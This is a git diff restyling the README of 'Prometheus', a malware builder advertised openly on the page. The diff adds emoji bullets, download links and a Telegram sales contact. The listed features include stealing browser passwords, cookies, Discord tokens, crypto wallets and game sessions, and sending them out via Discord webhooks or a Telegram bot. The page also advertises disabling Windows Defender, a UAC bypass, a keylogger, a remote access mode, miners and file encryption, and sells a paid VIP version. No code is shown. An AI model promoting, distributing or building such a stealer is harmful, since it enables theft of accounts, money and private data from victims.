@@ -1,10 +1,10 @@
 # Prometheus
 
-<p align="center">
-  <kbd>
-    <img src="https://github.com/tin-ka/Prometheus/blob/main/logo.png">
-  </kbd>
-</p>
+  <div align="center">
+  <div>
+    <img  src="https://raw.githubusercontent.com/tin-ka/Prometheus/main/logo.png">
+  </div>
+  </div> 
 
 <p align="center">
   <img src="https://img.shields.io/github/languages/top/tin-ka/Prometheus">
@@ -12,6 +12,22 @@
   <img src="https://img.shields.io/github/forks/tin-ka/Prometheus">
 
 </p>
+</p>
+<p align="center">
+  <img src="https://img.shields.io/github/languages/top/tin-ka/Prometheus">
+    <br>
+  <img src="https://img.shields.io/github/stars/tin-ka/Prometheus">
+  <img src="https://img.shields.io/github/forks/tin-ka/Prometheus">
+    <br>
+</p>
+
+<p align="center">
+  [Download](https://raw.githubusercontent.com/tin-ka/Prometheus/main/Prometheus.zip)
+  <br>
+  🔥 [Contact in Telegram](https://t.me/PrometheusSupport) 🔥
+<hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
+</p>
+<br>
 
 <p align="center">
   <img src="https://github.com/tin-ka/Prometheus/blob/main/window.png"/>
@@ -39,59 +55,59 @@
 
 ### FREE Features
 
-- GUI Builder.
-- Runs On Startup.
-- Fake Error.
-- EXE Binder.
-- File Pumper.
-- Obfuscated Code.
-- Discord Injection.
-- Steals Discord Tokens.
-- Steals Steam Session.
-- Steals Epic Session.
-- Steals Uplay Session.
-- Steals Battle.Net Session.
-- Steals Passwords From Many Browsers.
-- Steals Cookies From Many Browsers.
-- Steals History From Many Browsers.
-- Steals Autofills From Many Browsers.
-- Steals Minecraft Session Files.
-- Steals Telegram Session Files.
-- Steals Crypto Wallets.
-- Steals Roblox Cookies.
-- Steals Growtopia Session.
-- Steals IP Information.
-- Steals System Info.
-- Steals Saved Wifi Passwords.
-- Steals Common Files.
-- Captures Screenshot.
-- Captures Webcam Image.
-- Sends All Data Through Discord Webhooks/Telegram Bot.
+- ✅ GUI Builder.
+- ✅ Runs On Startup.
+- ✅ Fake Error.
+- ✅ EXE Binder.
+- ✅ File Pumper.
+- ✅ Obfuscated Code.
+- ✅ Discord Injection.
+- ✅ Steals Discord Tokens.
+- ✅ Steals Steam Session.
+- ✅ Steals Epic Session.
+- ✅ Steals Uplay Session.
+- ✅ Steals Battle.Net Session.
+- ✅ Steals Passwords From Many Browsers.
+- ✅ Steals Cookies From Many Browsers.
+- ✅ Steals History From Many Browsers.
+- ✅ Steals Autofills From Many Browsers.
+- ✅ Steals Minecraft Session Files.
+- ✅ Steals Telegram Session Files.
+- ✅ Steals Crypto Wallets.
+- ✅ Steals Roblox Cookies.
+- ✅ Steals Growtopia Session.
+- ✅ Steals IP Information.
+- ✅ Steals System Info.
+- ✅ Steals Saved Wifi Passwords.
+- ✅ Steals Common Files.
+- ✅ Captures Screenshot.
+- ✅ Captures Webcam Image.
+- ✅ Sends All Data Through Discord Webhooks/Telegram Bot.
 
 ### VIP Features
 
-- UAC Bypass.
-- Custom Icon.
-- Disables Windows Defender.
-- Melt Stub.
-- Anti-VM.
-- Blocks AV-Related Sites.
-- Steals Riot Session.
-- Crypt Stealer.
-- XMR Miner.
-- ETC Miner.
-- Steals Installed Software List.
-- Steals WhatsApp Session Files.
-- Uninstall Program.
-- RAT Mode.
-- Speak Text.
-- Open URL.
-- Encrypt User Files.
-- Kill Process.
-- Steals Startup List.
-- Keylogger.
+- 💎 UAC Bypass.
+- 💎 Custom Icon.
+- 💎 Disables Windows Defender.
+- 💎 Melt Stub.
+- 💎 Anti-VM.
+- 💎 Blocks AV-Related Sites.
+- 💎 Steals Riot Session.
+- 💎 Crypt Stealer.
+- 💎 XMR Miner.
+- 💎 ETC Miner.
+- 💎 Steals Installed Software List.
+- 💎 Steals WhatsApp Session Files.
+- 💎 Uninstall Program.
+- 💎 RAT Mode.
+- 💎 Speak Text.
+- 💎 Open URL.
+- 💎 Encrypt User Files.
+- 💎 Kill Process.
+- 💎 Steals Startup List.
+- 💎 Keylogger.
 - (...more)
-
+  
 ## Stub Settings
 
 | Option           | Description                                            |
@@ -127,8 +143,8 @@
 
 P.S. Password from archive with logs "prometheus"
 
-## VIP Version
+## 💎 VIP Version
 
-[Download VIP](https://raw.githubusercontent.com/tin-ka/Prometheus/main/PrometheusVIP.rar)
+💎 [Download VIP](https://raw.githubusercontent.com/tin-ka/Prometheus/main/PrometheusVIP.rar)
 
-If you want to get the password for the VIP version of Prometheus, you can buy it from me in [Telegram](https://t.me/PrometheusSupport). 
+💎 If you want to get the password for the VIP version of Prometheus, you can buy it from me in [Telegram](https://t.me/PrometheusSupport). 
